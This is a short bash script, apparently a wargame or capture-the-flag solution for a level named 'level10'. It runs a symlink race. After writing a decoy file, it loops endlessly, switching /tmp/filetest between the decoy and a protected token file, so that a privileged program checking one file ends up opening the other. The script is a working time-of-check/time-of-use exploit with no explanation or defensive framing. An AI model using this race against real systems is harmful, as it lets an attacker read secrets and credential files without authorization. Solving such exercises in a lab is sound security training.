#!/bin/bash

echo bonjour > /tmp/file

while true; do
    ln -sf /home/user/level10/token /tmp/filetest
    ln -sf /tmp/file /tmp/filetest
done
